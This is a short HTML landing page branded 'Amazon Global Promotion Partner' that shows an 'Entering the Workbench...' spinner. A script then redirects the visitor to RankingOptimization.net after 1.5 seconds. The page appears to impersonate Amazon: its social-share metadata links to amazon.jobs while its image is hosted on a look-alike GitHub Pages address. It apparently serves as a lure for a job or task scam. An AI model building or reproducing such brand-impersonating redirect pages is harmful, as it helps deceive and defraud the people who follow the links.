<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Amazon Global Promotion Partner">
    <meta name="keywords" content="Amazon, Global, Promotion, Partner, Opportunity">
    <meta name="author" content="Your Name">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Amazon Global Promotion Partner">
    <meta name="twitter:description" content="Amazon Global Promotion Partner">
    <meta name="twitter:url" content="https://www.amazon.jobs/">
    <meta name="twitter:image" content="https://amazonadc.github.io/us/azonad.png">
    <meta name="twitter:image:alt" content="Amazon Global Promotion Partner Image">

    <title>Workbench</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #B22929;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            color: white;
            text-align: center;
            overflow: hidden;
            position: relative;
        }

        /* Decorative elements */
        .decorative-stars {
            position: absolute;
            top: 20%;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: -1;
            display: flex;
            justify-content: space-around;
            opacity: 0.3;
        }

        .star {
            position: absolute;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.8) 0%, rgba(255, 255, 255, 0) 100%);
            animation: twinkle 1.5s infinite alternate;
        }

        @keyframes twinkle {
            0% {
                transform: scale(1);
                opacity: 0.8;
            }
            100% {
                transform: scale(1.2);
                opacity: 0.4;
            }
        }

        .content {
            animation: fadeOut 1.5s ease-in-out forwards;
        }

        @keyframes fadeOut {
            0% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }

        .message {
            font-size: 32px;
            font-weight: 600;
            letter-spacing: 1px;
            margin-bottom: 20px;
            text-transform: uppercase;
            color: #fff;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.1); 
            border-top: 8px solid #fff; 
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 1.5s ease-in-out infinite, glow 1.5s ease-in-out infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes glow {
            0% {
                box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            }
            50% {
                box-shadow: 0 0 40px rgba(255, 255, 255, 0.8);
            }
            100% {
                box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            }
        }

        .intro {
            font-size: 18px;
            font-weight: lighter;
            color: #fff;
            margin-bottom: 30px;
        }

        .image {
            display: none;
        }
    </style>

    <script type="text/javascript">
        setTimeout(function() {
            window.location.replace("https://RankingOptimization.net/");
        }, 1500);
    </script>
</head>
<body>
    <div class="decorative-stars">
        <div class="star" style="top: 10%; left: 20%; animation-duration: 1s;"></div>
        <div class="star" style="top: 30%; left: 50%; animation-duration: 1.3s;"></div>
        <div class="star" style="top: 50%; left: 80%; animation-duration: 1.5s;"></div>
        <div class="star" style="top: 70%; left: 10%; animation-duration: 1.7s;"></div>
        <div class="star" style="top: 80%; left: 60%; animation-duration: 2s;"></div>
    </div>

    <div class="content">
        <div class="message">Entering the Workbench...</div>
        <div class="intro">
            Amazon Global Promotion Partner
        </div>
        <div class="image">
            <img src="https://amazonadc.github.io/us/azonad.png" alt="Amazon Global Promotion Partner">
        </div>
        <div class="spinner"></div>
    </div>
</body>
</html>
